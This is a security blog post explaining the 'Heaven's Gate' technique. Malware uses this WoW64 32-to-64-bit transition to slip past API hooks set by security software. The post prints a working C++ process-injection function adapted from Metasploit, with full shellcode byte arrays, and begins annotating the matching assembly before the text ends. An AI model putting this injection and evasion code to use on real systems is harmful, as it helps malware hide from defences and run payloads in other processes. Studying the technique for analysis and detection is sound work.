<!DOCTYPE html>
<html class="" lang="en"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    
        <script>
            if (location.host != new URL("http:\/\/localhost:1313\/").host) location.href = "http:\/\/localhost:1313\/"
        </script>
    
    <meta name="viewport" content="width=device-width" />
    <meta http-equiv="Content-Type" content="text/html;charset=UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=7" />

    <link
    rel="icon"
    href='http://localhost:1313/favicon.png'
/>
<link
    rel="shortcut icon"
    href='http://localhost:1313/favicon.ico'
    type="image/x-icon"
/>
<link
    rel="apple-touch-icon"
    href='http://localhost:1313/apple-touch-icon.png'
/>

    <link
        rel="icon"
        href='http://localhost:1313/favicon.png'
        type="image/svg+xml"
    />

<title>
        
            Understanding Heaven´s Gate  &ndash;
        
        purpurina - a place for hacking
    </title>

    
    <link href="http://localhost:1313/symbols-nerd-font/symbols-nerd-font.css" rel="stylesheet" integrity="sha512-lydow8GLOLlYNOtHlksNCmGWWCBsbIEtikXpHzfWqx78HLlyQZHOzyLwPpKol4Th6aCwLUXOfODVYgwrd3nwKQ=="/>
    <link href="http://localhost:1313/jetbrains-mono/jetbrains-mono.css" rel="stylesheet" integrity="sha512-tJxlgL6v1Y7kFf+qB8SloaAMKnOAw6WouknxXtIjkBux9Y/9aX81EUWOJO8c/3l98DmjG8brr4to7zaez606Fg=="/>

    
    
    <link type="text/css" rel="stylesheet" href=http://localhost:1313/css/styles.b88203936c598b692d9cbebd7da89eb34e544b8522ae4c14ca657761be96b80c2acee8e6631de04d99ee1bdbc1bcad4a3add6f47a2366f4a29e2c531782be1a8.css integrity="sha512-uIIDk2xZi2ktnL69faies05US4UirkwUymV3Yb6WuAwqzujmYx3gTZnuG9vBvK1KOt1vR6I2b0op4sUxeCvhqA==" />
<meta name="author" content="jaco" />

    
        <meta name="keywords" content='evasion, firststeps, loader, maldev' />
    
    
        <meta name="description" content="-lore&#34;&gt;Heaven&amp;rsquo;s gate lore&lt;/h1&gt;
&lt;p&gt;The Heaven&amp;rsquo;s Gate tutorial was written by an anonymous hacker going online as Roy G. Biv, a member of a group called 29A.
After the group disbanded and their e-zine&amp;rsquo;s site went down, the Heaven&amp;rsquo;s Gate technique was later &lt;a href=&#34;https://github.com/darkspik3/Valhalla-ezines/blob/master/Valhalla%20%231/articles/HEAVEN.TXT&#34;&gt;reprinted in the 2009 edition of the Valhalla hacker e-zine&lt;/a&gt;. I personally would check this resource, as it was the first time the technique was commented.&lt;/p&gt;" />
    

<meta property="og:site_name"
    content='purpurina - a place for hacking' />

    <meta property="og:title" content="Understanding Heaven´s Gate" />
    <meta property="og:type" content="article" />
    
    <meta
        property="article:author" content="jaco" />
    <meta
        property="article:published_time"
        content='2024-09-19T20:53:30Z&#43;0100' />
    
        
            <meta property="article:tag" content="evasion" />
        
            <meta property="article:tag" content="firststeps" />
        
            <meta property="article:tag" content="loader" />
        
            <meta property="article:tag" content="maldev" />
        
    
    <meta property="og:url" content="http://localhost:1313/posts/wow64/" />
    
    
    <meta property="og:image"
        content="http://localhost:1313/icon512.png" />
    
        <meta property="og:description" content="&lt;h1 id=&#34;heavens-gate-lore&#34;&gt;Heaven&amp;rsquo;s gate lore&lt;/h1&gt;
&lt;p&gt;The Heaven&amp;rsquo;s Gate tutorial was written by an anonymous hacker going online as Roy G. Biv, a me" />
    

<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:domain"
      content='localhost:1313'
/>
<meta property="twitter:url" content="http://localhost:1313/posts/wow64/" />


    <meta name="twitter:title" content="Understanding Heaven´s Gate" />
    
    
    
    <meta name="twitter:image"
        content="http://localhost:1313/icon512.png" />
    
        <meta name="twitter:description" content="&lt;h1 id=&#34;heavens-gate-lore&#34;&gt;Heaven&amp;rsquo;s gate lore&lt;/h1&gt;
&lt;p&gt;The Heaven&amp;rsquo;s Gate tutorial was written by an anonymous hacker going online as Roy G. Biv, a me" />
    

<link rel="manifest" href="http://localhost:1313/manifest/index.json" />
</head>


<body>
        <div id="baseContainer"><header class="">
<div class="titleAndSearchContainer">
        <div id="titleContainer">
            
                <a class="unstyledLink" href="http://localhost:1313/">
                    <img src='http://localhost:1313/logo.jpg' alt='Logo'/>
                </a>
            
            <div class="rightOfLogo">
                <div class="titleAndHamburger">
                    <h1>
                        <a class="unstyledLink" href="http://localhost:1313/">purpurina - a place for hacking</a>
                        
                    </h1>
                    
                </div>
                <div id="wide_nav"><nav>
    
    <ul id="main-nav">
        <li><a href="http://localhost:1313/">Home</a></li>
        
            <li><a href="http://localhost:1313/posts/">Posts</a></li>
        
        
        
        
        
        
            <li><a href="http://localhost:1313/about/">About</a></li>
        
        
            <li><a href="http://localhost:1313/tags/">Tags</a></li>
        
        
    </ul>
</nav>
</div>
            </div>
        </div>
        <div class="search">
    <input id="searchbar" type="text" placeholder='Search' />
    <span class="nerdlink" onclick="newSearch();">&#xf002;</span>
</div>
<script>
    function newSearch() {
        let term = searchbar.value.trim();
        if (!term) return;
        location.href = `/search/?q=${term}`;
    }
    searchbar.onkeyup = (ev) => {if (ev.keyCode == 13) newSearch()};
</script>

    </div>
    <div id="links">
        
        
        <a
    
        rel="noreferrer"
    
    target="_blank"
    class="nerdlink"
    href="https://www.linkedin.com/in/jacobocasado/?originalSubdomain=es">
    
    
        &#xf0e1;
    
    <span>
        LinkedIn
    </span>
</a>

    </div>
    

</header>
<div id="contentContainer">
                <div id="content">
                    <main>
<article class="card single">
    
        <h1>Understanding Heaven´s Gate</h1>
    
    
        <p class="date">
            <span title='Date'> </span>
    2024-09-19

</p>
    
    
    
    <div class="articleToc">
    <nav id="TableOfContents">
  <ul>
    <li><a href="#the-compatibility-layer-wow64">The compatibility layer: WoW64</a></li>
  </ul>

  <ul>
    <li><a href="#analyzing-a-heavens-gate-implementation">Analyzing a Heaven&rsquo;s Gate implementation</a></li>
    <li><a href="#disassembling-and-analyzing-execute64">Disassembling and analyzing EXECUTE64</a></li>
  </ul>
</nav>
    <hr />
</div>

    <div><h1 id="heavens-gate-lore">Heaven&rsquo;s gate lore</h1>
<p>The Heaven&rsquo;s Gate tutorial was written by an anonymous hacker going online as Roy G. Biv, a member of a group called 29A.
After the group disbanded and their e-zine&rsquo;s site went down, the Heaven&rsquo;s Gate technique was later <a href="https://github.com/darkspik3/Valhalla-ezines/blob/master/Valhalla%20%231/articles/HEAVEN.TXT">reprinted in the 2009 edition of the Valhalla hacker e-zine</a>. I personally would check this resource, as it was the first time the technique was commented.</p>
<h1 id="why-does-heavens-gate-exist">Why does Heaven&rsquo;s gate exist?</h1>
<p>In a normal environment, we have 64-bit Windows operative systems (or at least, we expect so). Some detection mechanisms, like antivirus software and OS security features, <strong>do not detect a 32-bit process jumping from running 32-bit compatible code to 64-bit code.</strong> And this is because a 32-bit program cannot inject code into 64-bit programs natively.
Indeed, 32-bit programs can run on a 64-bit OS because there is a compatibility layer: <strong>WoW64</strong>.</p>
<h2 id="the-compatibility-layer-wow64">The compatibility layer: WoW64</h2>
<p>In a 64-bit Windows kernel, the first piece of code to execute in <strong>any</strong> process is <strong>always</strong> the 64-bit DLL called <strong>ntdll.dll</strong>, also called NTDLL.
This DLL takes care of <strong>initializing the process in user-mode as a 64-bit process</strong> and setting up the execution of the process.</p>
<p><strong>But, what happens when a 64-bit Windows kernel runs a 32-bit process?</strong> How does Windows allow that kind of compatibility?
Well, after NTDLL is loaded, the <strong>Windows on Windows (WoW64)</strong> interface takes over and <strong>loads a 32-bit version of ntdll.dll, called ntdll32.dll</strong>. After loading this DLL, the execution <strong>turns into a 32-bit mode through a far jump to a compatibility code segment</strong> that changes the processor context to work to 32 bits for this process. From now on, for that process, its environment (registers, instructions) is 32-bit. Nevertheless, the kernel is still 64 bit so, <strong>when the process has to perform a syscall (and interact with the kernel space)</strong> the 32-bit NTDLL that was loaded <strong>changes the execution environment to 64-bit mode, executes the 64-bit syscall (calling the 64-bit NTDLL)</strong>, and, once the <em>syscall</em> is performed ntdll32.dll returns the process to 32-bit mode. We can think of ntdll32.dll as a &ldquo;proxy&rdquo; so that the processor runs 32-bit code and 64-bit code when necessary (this is mainly when executing <em>syscalls</em>) in a 64-bit operative system.</p>
<p>This process is better described in <a href="http://download.microsoft.com/download/3/a/9/3a9ad58f-5634-4cdd-8528-c78754d712e8/28-dw04040_winhec2004.ppt">many</a> <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa384274(v=vs.85).aspx">sources</a>, including in the <a href="https://www.safaribooksonline.com/library/view/windows-internals-fifth/9780735625303/ch03s08.html">Windows Internals books</a>, so if you’re interested in reading more, you can do so, but I’ll try to do my best here.</p>
<h1 id="but-what-is-wrong-with-heavens-gate">But, what is wrong with Heaven&rsquo;s Gate?</h1>
<p>Besides the fact that this technique is pretty old (I think this is the <a href="https://github.com/darkspik3/Valhalla-ezines/blob/master/Valhalla%20%231/articles/HEAVEN.TXT">original post</a> which has been since 2008), it has been used in a lot of malware campaigns, like <a href="https://blogs.blackberry.com/en/2023/01/emotet-returns-with-new-methods-of-evasion">Emotet</a>, a banking trojan. For example, the Emotet malware uses Heaven&rsquo;s Gate to perform process hollowing (another malware technique) <strong>from a 32-bit process to a 64-bit process</strong>.</p>
<p><strong>But why is this used?</strong> Well, this technique is used to <strong>bypass the WoW64 API hooks</strong> performed by the security solutions. While a 32-bit process would normally <strong>pass through the 32-bit API hooks</strong> made by the 32-bit NTDLL.dll (which are the ones monitored by the security solutions), malicious programs can <strong>perform a jump instruction past these hooks in order to execute 64-bit code</strong> from a 32-bit process without having to trigger the API call, which is hooked by the security solutions. Overall, <strong>this is used as an evasion mechanism.</strong></p>
<p>Windows initially developed this on the assumption that the 64-bit ntdll.dll could not be accessed by a 32-bit process, but Heaven’s Gate takes advantage of this by running x64 instructions which will be completely missed by any application expecting x86 instructions.</p>
<p>Also, this technique is used to difficult the analysis of the malware samples, as it makes the debugging and emulation harder (and the <em>reversing</em> process of these samples overall).</p>
<h2 id="analyzing-a-heavens-gate-implementation">Analyzing a Heaven&rsquo;s Gate implementation</h2>
<p>There are a lot of different implementations of this technique, but they have 90% of the code in common. I will analyze the Heaven&rsquo;s Gate implementation used in the Metasploit Framework, as it is offered as a C++ function.</p>
<p>The Meterpreter shell <a href="https://github.com/rapid7/meterpreter/blob/5e24206d510a48db284d5f399a6951cd1b4c754b/source/common/arch/win/i386/base_inject.c">has a functionality to inject 64-bit code in 64-bit processes from 32-bit meterpreter shells</a>. I use a slightly modified code to <strong>perform the Heaven&rsquo;s Gate, call CreateRemoteThread with a 64-bit shellcode in order to inject 64-bit code from a 32-bit process to a 64-bit code</strong>. My code is the following:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#75715e">// Definitions used for running native x64 code from a wow64 process
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// (src: https://github.com/rapid7/meterpreter/blob/5e24206d510a48db284d5f399a6951cd1b4c754b/source/common/arch/win/i386/base_inject.h)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">typedef</span> <span style="color:#a6e22e">BOOL</span> (WINAPI <span style="color:#f92672">*</span> X64FUNCTION)( DWORD dwParameter );
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#a6e22e">DWORD</span> (WINAPI <span style="color:#f92672">*</span> EXECUTEX64)( X64FUNCTION pFunction, DWORD dwParameter );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">InjectWOW64</span>(HANDLE hProc, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span> payload, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> payload_len) {
</span></span><span style="display:flex;"><span><span style="color:#75715e">//	src: https://github.com/rapid7/meterpreter/blob/5e24206d510a48db284d5f399a6951cd1b4c754b/source/common/arch/win/i386/base_inject.c
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>	LPVOID pRemoteCode <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>	EXECUTEX64 pExecuteX64   <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>	X64FUNCTION pX64function <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>	WOW64CONTEXT <span style="color:#f92672">*</span> ctx       <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">/*
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> A simple function to execute native x64 code from a wow64 (x86) process. 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> Can be called from C using the following prototype:
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     typedef DWORD (WINAPI * EXECUTEX64)( X64FUNCTION pFunction, DWORD dwParameter );
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> The native x64 function you specify must be in the following form (as well as being x64 code):
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     typedef BOOL (WINAPI * X64FUNCTION)( DWORD dwParameter );
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> Original binary:
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    src: https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/migrate/executex64.asm
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	src: https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x64/src/migrate/remotethread.asm
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">*/</span>
</span></span><span style="display:flex;"><span>	BYTE sh_executex64[] <span style="color:#f92672">=</span>	<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x55\x89\xE5\x56\x57\x8B\x75\x08\x8B\x4D\x0C\xE8\x00\x00\x00\x00</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>							<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x58\x83\xC0\x2B\x83\xEC\x08\x89\xE2\xC7\x42\x04\x33\x00\x00\x00</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>							<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x89\x02\xE8\x0F\x00\x00\x00\x66\x8C\xD8\x66\x8E\xD0\x83\xC4\x14</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>							<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x5F\x5E\x5D\xC2\x08\x00\x8B\x3C\xE4\xFF\x2A\x48\x31\xC0\x57\xFF</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>							<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xD6\x5F\x50\xC7\x44\x24\x04\x23\x00\x00\x00\x89\x3C\x24\xFF\x2C</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>							<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x24</span><span style="color:#e6db74">&#34;</span>;
</span></span><span style="display:flex;"><span>	BYTE sh_wownativex[] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xFC\x48\x89\xCE\x48\x89\xE7\x48\x83\xE4\xF0\xE8\xC8\x00\x00\x00</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>							<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x41\x51\x41\x50\x52\x51\x56\x48\x31\xD2\x65\x48\x8B\x52\x60\x48</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>							<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x8B\x52\x18\x48\x8B\x52\x20\x48\x8B\x72\x50\x48\x0F\xB7\x4A\x4A</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>							<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x4D\x31\xC9\x48\x31\xC0\xAC\x3C\x61\x7C\x02\x2C\x20\x41\xC1\xC9</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>							<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x0D\x41\x01\xC1\xE2\xED\x52\x41\x51\x48\x8B\x52\x20\x8B\x42\x3C</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>							<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\x01\xD0\x66\x81\x78\x18\x0B\x02\x75\x72\x8B\x80\x88\x00\x00</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>							<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x48\x85\xC0\x74\x67\x48\x01\xD0\x50\x8B\x48\x18\x44\x8B\x40</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>							<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x20\x49\x01\xD0\xE3\x56\x48\xFF\xC9\x41\x8B\x34\x88\x48\x01\xD6</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>							<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x4D\x31\xC9\x48\x31\xC0\xAC\x41\xC1\xC9\x0D\x41\x01\xC1\x38\xE0</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>							<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x75\xF1\x4C\x03\x4C\x24\x08\x45\x39\xD1\x75\xD8\x58\x44\x8B\x40</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>							<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x24\x49\x01\xD0\x66\x41\x8B\x0C\x48\x44\x8B\x40\x1C\x49\x01\xD0</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>							<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x41\x8B\x04\x88\x48\x01\xD0\x41\x58\x41\x58\x5E\x59\x5A\x41\x58</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>							<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x41\x59\x41\x5A\x48\x83\xEC\x20\x41\x52\xFF\xE0\x58\x41\x59\x5A</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>							<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\x8B\x12\xE9\x4F\xFF\xFF\xFF\x5D\x4D\x31\xC9\x41\x51\x48\x8D</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>							<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x46\x18\x50\xFF\x76\x10\xFF\x76\x08\x41\x51\x41\x51\x49\xB8\x01</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>							<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x48\x31\xD2\x48\x8B\x0E\x41\xBA\xC8</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>							<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x38\xA4\x40\xFF\xD5\x48\x85\xC0\x74\x0C\x48\xB8\x00\x00\x00\x00</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>							<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x00\x00\x00\xEB\x0A\x48\xB8\x01\x00\x00\x00\x00\x00\x00\x00</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>							<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\x83\xC4\x50\x48\x89\xFC\xC3</span><span style="color:#e6db74">&#34;</span>;
</span></span><span style="display:flex;"><span>							
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> sh_executex64_len <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(sh_executex64);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> sh_wownativex_len <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(sh_wownativex);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// inject payload into target process
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	pRemoteCode <span style="color:#f92672">=</span> VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
</span></span><span style="display:flex;"><span>	WriteProcessMemory(hProc, pRemoteCode, (PVOID) payload, (SIZE_T) payload_len, (SIZE_T <span style="color:#f92672">*</span>) NULL);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	printf(<span style="color:#e6db74">&#34;remcode = %p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, pRemoteCode); getchar();
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// alloc a RW buffer in this process for the EXECUTEX64 function
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	pExecuteX64 <span style="color:#f92672">=</span> (EXECUTEX64)VirtualAlloc( NULL, <span style="color:#66d9ef">sizeof</span>(sh_executex64), MEM_RESERVE<span style="color:#f92672">|</span>MEM_COMMIT, PAGE_READWRITE );
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// alloc a RW buffer in this process for the X64FUNCTION function (and its context)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	pX64function <span style="color:#f92672">=</span> (X64FUNCTION)VirtualAlloc( NULL, <span style="color:#66d9ef">sizeof</span>(sh_wownativex)<span style="color:#f92672">+</span><span style="color:#66d9ef">sizeof</span>(WOW64CONTEXT), MEM_RESERVE<span style="color:#f92672">|</span>MEM_COMMIT, PAGE_READWRITE );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// printf(&#34;pExecuteX64 = %p ; pX64function = %p\n&#34;, pExecuteX64, pX64function); getchar();
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// copy over the wow64-&gt;x64 stub
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	memcpy( pExecuteX64, sh_executex64, sh_executex64_len );
</span></span><span style="display:flex;"><span>	VirtualAlloc( pExecuteX64, <span style="color:#66d9ef">sizeof</span>(sh_executex64), MEM_COMMIT, PAGE_EXECUTE_READ );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// copy over the native x64 function
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	memcpy( pX64function, sh_wownativex, sh_wownativex_len );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// pX64function shellcode modifies itself during the runtime, so memory has to be RWX
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	VirtualAlloc( pX64function, <span style="color:#66d9ef">sizeof</span>(sh_wownativex)<span style="color:#f92672">+</span><span style="color:#66d9ef">sizeof</span>(WOW64CONTEXT), MEM_COMMIT, PAGE_EXECUTE_READWRITE );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// set the context
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	ctx <span style="color:#f92672">=</span> (WOW64CONTEXT <span style="color:#f92672">*</span>)( (BYTE <span style="color:#f92672">*</span>)pX64function <span style="color:#f92672">+</span> sh_wownativex_len );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	ctx<span style="color:#f92672">-&gt;</span>h.hProcess       <span style="color:#f92672">=</span> hProc;
</span></span><span style="display:flex;"><span>	ctx<span style="color:#f92672">-&gt;</span>s.lpStartAddress <span style="color:#f92672">=</span> pRemoteCode;
</span></span><span style="display:flex;"><span>	ctx<span style="color:#f92672">-&gt;</span>p.lpParameter    <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>	ctx<span style="color:#f92672">-&gt;</span>t.hThread        <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// run a new thread in target process
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	pExecuteX64( pX64function, (DWORD)ctx );
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>( ctx<span style="color:#f92672">-&gt;</span>t.hThread ) {
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// if success, resume the thread -&gt; execute payload
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		ResumeThread(ctx<span style="color:#f92672">-&gt;</span>t.hThread);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// cleanup in target process
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		VirtualFree(pExecuteX64, <span style="color:#ae81ff">0</span>, MEM_RELEASE);
</span></span><span style="display:flex;"><span>		VirtualFree(pX64function, <span style="color:#ae81ff">0</span>, MEM_RELEASE);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>This function receives:</p>
<ul>
<li>The handle to the 64 bit process to inject the 64-bit shellcode.</li>
<li>The 64-bit shellcode.</li>
<li>The size of the shellcode.</li>
</ul>
<p>Then, the steps to execute the 64-bit shellcode in the 64-bit target process are the following:</p>
<ul>
<li>Allocate memory space in the target process and copy the 64-bit shellcode for further execution.</li>
<li>In the 32-bit process, a RW buffer is allocated for the EXECUTEX64 function. <strong>This is the function that performs THE TRANSITION FROM 32-bit to 64-bit space, calls X64FUNCTION (we will see what this is in a moment) and returns from 64-bit to 32-bit space.</strong></li>
<li>In the 32-bit process, a RW buffer is allocated for for the X64FUNCTION function (and its context). <strong>This function is basically the 64-bit shellcode of CreateRemoteThread, as we want to create a thread in the remote process with our shellcode as the starting point</strong>.</li>
<li>We change the memory properties of the X64FUNCTION function zone (the CreateRemoteThread) as it modifies itself during runtime.</li>
<li>We run a new thread in the target process using the EXECUTE64 function, passing the address of the memory we allocated in the first step (therefore, pointing to the shellcode we want to execute).</li>
<li>Resume the thread (the thread is created in suspended state, as the flag CREATE_SUSPENDED is used in the shellcode that runs the thread).</li>
<li>Free the memory in the 32-bit process as it is no longer needed.</li>
</ul>
<p>Note that we could <strong>have a modified version of this function so that the 64-bit function that is executed is not CreateRemoteThread</strong>, but a Windows API call (for example), or an arbitrary 64-bit function shellcode.</p>
<h2 id="disassembling-and-analyzing-execute64">Disassembling and analyzing EXECUTE64</h2>
<p>We want to analyze the <strong>protagonist of this technique: the EXECUTE64 shellcode, which acts as the function that performs the &ldquo;jump&rdquo; to the 32-bit world to the 64-bit world and executes our function.</strong> This is the function that performs the Heaven&rsquo;s Gate, so it is the interesting one.</p>
<p>We could use a <a href="https://defuse.ca/online-x86-assembler.htm">known online disassembler</a> and copy the <code>sh_executex64</code> shellcode that is in the code, but we could also take the official ASM that is <a href="https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/migrate/executex64.asm">declared in the Metasploit Framework</a> that is basically the same code, but in ASM representation. It will be easier for us to comment.</p>
<p>Let&rsquo;s analyze the code:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span>; A simple function to execute native x64 code from a <span style="color:#a6e22e">wow64</span> (x86) process. 
</span></span><span style="display:flex;"><span>; Can be called from C <span style="color:#66d9ef">using</span> the following prototype:
</span></span><span style="display:flex;"><span>;     <span style="color:#66d9ef">typedef</span> <span style="color:#a6e22e">DWORD</span> (WINAPI <span style="color:#f92672">*</span> EXECUTEX64)( X64FUNCTION pFunction, DWORD dwParameter );
</span></span><span style="display:flex;"><span>; The native x64 function you specify must be in the following <span style="color:#a6e22e">form</span> (as well as being x64 code)<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>;     <span style="color:#66d9ef">typedef</span> <span style="color:#a6e22e">BOOL</span> (WINAPI <span style="color:#f92672">*</span> X64FUNCTION)( DWORD dwParameter );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>; Clobbers: EAX, ECX and EDX (ala the normal stdcall calling convention)
</span></span><span style="display:flex;"><span>; Un<span style="color:#f92672">-</span>Clobbered: EBX, ESI, EDI, ESP and EBP can be expected to remain un<span style="color:#f92672">-</span>clobbered.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[BITS <span style="color:#ae81ff">32</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>WOW64_CODE_SEGMENT	EQU <span style="color:#ae81ff">0x23</span>
</span></span><span style="display:flex;"><span>X64_CODE_SEGMENT	EQU <span style="color:#ae81ff">0x33</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>start:
</span></span><span style="display:flex;"><span>	push ebp 								; Stack prologue, save EBP
